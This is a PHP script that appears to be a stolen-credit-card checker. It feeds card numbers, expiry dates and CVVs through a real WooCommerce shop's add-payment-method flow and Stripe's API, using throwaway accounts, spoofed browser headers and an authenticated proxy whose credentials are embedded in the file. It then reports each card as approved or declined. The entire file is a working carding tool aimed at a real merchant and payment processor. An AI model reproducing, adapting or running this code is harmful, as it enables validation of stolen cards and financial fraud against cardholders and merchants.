
<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');
header('Content-Type: text/plain; charset=utf-8');

$lista = $_GET['lista'] ?? '';
$dados = explode("|", $lista);
$cc  = trim($dados[0] ?? '');
$mes = trim($dados[1] ?? '');
$ano = trim($dados[2] ?? '');
$cvv = trim($dados[3] ?? '');
if (!$cvv) $cvv = "000";


if (strlen($ano) === 2) {
    $anoFull = "20" . $ano;
} elseif (strlen($ano) === 4) {
    $anoFull = $ano;
} else {
    exit;
}
$yy  = substr($anoFull, 2);
$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);

$started = microtime(true);

$dominios = ['gmail.com','hotmail.com','outlook.com','yahoo.com','live.com','icloud.com'];
$email = strtolower('fallen.jackson' . rand(100, 9999) . '@' . $dominios[array_rand($dominios)]);

$cookieFile = __DIR__ . '/cookies_' . uniqid() . '.txt';
$proxyUrl = 'http://9764079bd6bd94a4ce32:29261f058caf8566@gw.dataimpulse.com:823';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://thelovegrass.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxyUrl);
curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://thelovegrass.com/',
    'Upgrade-Insecure-Requests: 1',
]);
$response1 = curl_exec($ch);
curl_close($ch);

preg_match('/name="woocommerce-register-nonce"\s+value="([^"]+)"/i', $response1, $mn);
$nonce_register = $mn[1] ?? null;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://thelovegrass.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxyUrl);
curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://thelovegrass.com',
    'Connection: keep-alive',
    'Referer: https://thelovegrass.com/my-account/add-payment-method/',
    'Upgrade-Insecure-Requests: 1',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
    'email=' . urlencode($email) .
    '&woocommerce-register-nonce=' . urlencode($nonce_register) .
    '&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Register'
);
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://thelovegrass.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxyUrl);
curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://thelovegrass.com/my-account/add-payment-method/',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$response2 = curl_exec($ch);
curl_close($ch);

preg_match('/name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"/i', $response2, $mpm);
$nonce_add_pm = $mpm[1] ?? null;

preg_match('/createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]+)["\']/', $response2, $majax);
$ajax_nonce = $majax[1] ?? null;

$cardFormatted = trim(chunk_split($cc, 4, '+'));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0',
    'Accept: application/json',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'Referer: https://js.stripe.com/',
    'Origin: https://js.stripe.com',
    'Connection: keep-alive',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'Priority: u=4',
    'Pragma: no-cache',
    'Cache-Control: no-cache',
    'TE: trailers',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
    'billing_details[email]=' . urlencode($email) .
    '&billing_details[address][country]=BR' .
    '&type=card' .
    '&card[number]=' . $cardFormatted .
    '&card[cvc]=' . urlencode($cvv) .
    '&card[exp_year]=' . urlencode($yy) .
    '&card[exp_month]=' . urlencode($mes) .
    '&allow_redisplay=unspecified' .
    '&pasted_fields=number' .
    '&payment_user_agent=stripe.js%2F85e5c00324%3B+stripe-js-v3%2F85e5c00324%3B+payment-element%3B+deferred-intent' .
    '&referrer=https%3A%2F%2Fthelovegrass.com' .
    '&time_on_page=' . rand(10000, 60000) .
    '&guid=NA&muid=NA&sid=NA' .
    '&key=pk_live_hDcAS0zPwNPKc4bPqbOkwo1B' .
    '&_stripe_version=2026-03-25.dahlia'
);
$response_stripe = curl_exec($ch);
curl_close($ch);

$jStripe = json_decode($response_stripe, true);
$payment_method_id = $jStripe['id'] ?? null;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://thelovegrass.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxyUrl);
curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0',
    'Accept: */*',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://thelovegrass.com',
    'Alt-Used: thelovegrass.com',
    'Connection: keep-alive',
    'Referer: https://thelovegrass.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Pragma: no-cache',
    'Cache-Control: no-cache',
    'TE: trailers',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
    'action=wc_stripe_create_and_confirm_setup_intent' .
    '&wc-stripe-payment-method=' . $payment_method_id .
    '&wc-stripe-payment-type=card' .
    '&_ajax_nonce=' . $ajax_nonce
);
$response_ajax = curl_exec($ch);
curl_close($ch);

$jAjax = json_decode($response_ajax, true);

$setup_intent_id = $jAjax['data']['id'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://thelovegrass.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxyUrl);
curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://thelovegrass.com',
    'Connection: keep-alive',
    'Referer: https://thelovegrass.com/my-account/add-payment-method/',
    'Upgrade-Insecure-Requests: 1',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
    'payment_method=stripe' .
    '&wc-stripe-payment-method-upe=' .
    '&wc_stripe_selected_upe_payment_type=' .
    '&woocommerce-add-payment-method-nonce=' . urlencode($nonce_add_pm) .
    '&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F' .
    '&woocommerce_add_payment_method=1' .
    '&wc-stripe-payment-method=' . $payment_method_id .
    '&wc-stripe-setup-intent=' . $setup_intent_id
);
$response_final = curl_exec($ch);
curl_close($ch);

$elapsed = round(microtime(true) - $started);

$msg = 'coracao do aice';
if (preg_match('/class="woocommerce-message"[^>]*>(.*?)<\/div>/is', $response_final, $m)) {
    $msg = trim(preg_replace('/\s+/', ' ', strip_tags($m[1])));
} elseif (preg_match('/class="woocommerce-error"[^>]*>(.*?)<\/div>/is', $response_final, $m)) {
    $msg = trim(preg_replace('/\s+/', ' ', strip_tags($m[1])));
} elseif (preg_match('/class="woocommerce-info"[^>]*>(.*?)<\/div>/is', $response_final, $m)) {
    $msg = trim(preg_replace('/\s+/', ' ', strip_tags($m[1])));
}

if (stripos($msg, 'successfully added') !== false || stripos($msg, 'added') !== false) {
    echo "Aprovada » $cc|$mes|$anoFull|$cvv » $msg » - {$elapsed}s » @OverThinkingHer";
} else {
    echo "Reprovada » $cc|$mes|$anoFull|$cvv » $msg » - {$elapsed}s » @OverThinkingHer";
}

@unlink($cookieFile);

?>